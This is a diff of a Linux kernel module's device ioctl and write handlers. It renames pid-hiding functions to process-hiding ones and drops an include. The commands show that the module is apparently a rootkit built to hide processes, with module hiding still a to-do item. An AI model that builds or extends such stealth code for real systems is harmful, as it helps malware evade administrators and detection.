@@ -25,7 +25,6 @@
 #include "ctrl/ctrl.h"
 #include "device/details/cdev_utils.h"
 #include "device/details/file_ops.h"
-#include "device/details/ioctl_cmd.h"
 
 long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
 {
@@ -72,7 +71,7 @@ long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
             return retval;
         }
         p_dev = p_file->private_data;
-        retval = ioc_hide_pid(p_dev, pid);
+        retval = ioc_hide_proc(p_dev, pid);
         break;
     case CROC_IOC_SHOW_PID:
         retval = __get_user(pid, (pid_t __user*)arg);
@@ -80,7 +79,7 @@ long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
             return retval;
         }
         p_dev = p_file->private_data;
-        retval = ioc_show_pid(p_dev, pid);
+        retval = ioc_show_proc(p_dev, pid);
         break;
     case CROC_IOC_HIDE_MOD:
         /* @todo    Implement */
@@ -160,10 +159,10 @@ ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, l
 
     if (cmd & CROC_IOC_PID) {
         if (cmd & CROC_IOC_HIDE_CMD) {
-            rc = ioc_hide_pid(p_dev, arg);
+            rc = ioc_hide_proc(p_dev, arg);
             KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been hidden with result %d", arg, rc);
         } else if (cmd & CROC_IOC_SHOW_CMD) {
-            rc = ioc_show_pid(p_dev, arg);
+            rc = ioc_show_proc(p_dev, arg);
             KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been showed with result %d", arg, rc);
         } else {
             return -EFAULT;
